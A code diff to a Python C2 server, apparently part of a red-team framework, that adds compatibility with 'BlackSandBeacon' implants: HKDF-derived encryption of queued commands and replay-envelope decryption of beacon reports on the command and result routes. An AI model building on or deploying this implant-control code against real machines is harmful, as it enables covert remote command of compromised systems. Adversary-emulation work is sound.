@@ -2944,6 +2944,19 @@ results = {}
 commands_history = {}
 remote_commands_history = {}
 connected_clients = set()
+# BlackSandBeacon clients speak HKDF + replay envelope; mark them so the
+# /command/ handlers pick the matching key family (see modules/bsb_compat).
+_bsb_beacon_clients: set[str] = set()
+try:
+    _bsb_boot_id = str((_payload_snapshot or {}).get("beacon_client_id", "") or "").strip()
+    if _bsb_boot_id:
+        _bsb_beacon_clients.add(_bsb_boot_id)
+    else:
+        # bof_delivery stages BSB beacons under this default id when the
+        # payload does not pin one, so mark it proactively.
+        _bsb_beacon_clients.add("linux_beacon")
+except Exception:
+    pass
 path = os.getcwd()
 atomic_framework_path = f"{path}/external/.exploit/atomic-red-team/atomics"
 events = []
@@ -3483,6 +3496,23 @@ def index():
     )
 
 
+def _encrypt_command_for(client_id: str, command: bytes) -> str:
+    """Encrypt a queued command under the key family of its beacon.
+
+    BlackSandBeacon beacons derive their AES key via HKDF from the raw C2
+    key material, so commands for them must be sealed with the derived
+    key (modules/bsb_compat). Everything else keeps the legacy raw key.
+    """
+    if client_id in _bsb_beacon_clients:
+        try:
+            from modules.bsb_compat import encrypt_bsb_command
+
+            return encrypt_bsb_command(command, _current_aes_key())
+        except Exception as exc:
+            logging.warning("[bsb_compat] BSB command encrypt failed, raw key fallback: %s", exc)
+    return encrypt_data(command)
+
+
 @app.route("/command/<client_id>", methods=["GET"])
 @app.route(f"{route_malleable}<client_id>", methods=["GET"])
 @limiter.exempt
@@ -3542,14 +3572,14 @@ def send_command(client_id):
 
     if client_id in commands:
         command = commands.pop(client_id)
-        encrypted_command = encrypt_data(command.encode())
+        encrypted_command = _encrypt_command_for(client_id, command.encode())
         return Response(encrypted_command)
     else:
         try:
             cmd_queue_file_real = _secure_command_queue_path(client_id)
         except ValueError:
             logging.info("Rejected invalid client_id in send_command")
-            encrypted_response = encrypt_data(b"")
+            encrypted_response = _encrypt_command_for(client_id, b"")
             return Response(encrypted_response, mimetype="application/octet-stream")
 
         if os.path.isfile(cmd_queue_file_real):
@@ -3560,12 +3590,12 @@ def send_command(client_id):
                     command = cmds.pop(0)
                     with open(cmd_queue_file_real, "w") as f:
                         json.dump(cmds, f)
-                    encrypted_command = encrypt_data(command.encode())
+                    encrypted_command = _encrypt_command_for(client_id, command.encode())
                     return Response(encrypted_command)
             except (OSError, ValueError, json.JSONDecodeError):
                 pass
         logging.info(f"No command for client {client_id}")
-        encrypted_response = encrypt_data(b"")
+        encrypted_response = _encrypt_command_for(client_id, b"")
         return Response(encrypted_response, mimetype="application/octet-stream")
 
 
@@ -3691,8 +3721,18 @@ def receive_result(client_id):
     try:
         logging.info(f"Receiving result from client {client_id}")
         encrypted_data = request.get_data()
-        decrypted_data = decrypt_data(encrypted_data)
-        data = json.loads(decrypted_data)
+        data = None
+        try:
+            data = json.loads(decrypt_data(encrypted_data))
+        except Exception:
+            data = None
+        if not isinstance(data, dict):
+            # BlackSandBeacon protocol: HKDF-derived key + replay envelope.
+            from modules.bsb_compat import decrypt_bsb_report
+
+            data, _bsb_counter, _bsb_ts = decrypt_bsb_report(encrypted_data, _current_aes_key())
+            _bsb_beacon_clients.add(str(client_id))
+            logging.info(f"BSB report from {client_id} (counter={_bsb_counter})")
         if client_id not in connected_clients:
             connected_clients.add(client_id)
             if config.enable_c2_debug:
